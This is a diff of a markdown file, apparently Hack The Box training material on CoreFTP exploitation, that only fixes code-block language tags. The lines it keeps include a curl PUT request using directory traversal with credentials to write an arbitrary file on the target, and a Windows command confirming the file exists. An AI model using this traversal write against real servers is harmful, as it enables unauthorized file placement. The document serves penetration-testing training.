@@ -14,8 +14,7 @@ This FTP service uses an HTTP `POST` request to upload files. However, the CoreF
 
 #### CoreFTP Exploitation
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
 ```
 
@@ -51,8 +50,7 @@ After the task has been completed, we will be able to find this file with the co
 
 #### Target System
 
-```
-        cmd
+```bat
 C:\> type C:\whoops
 
 PoC.
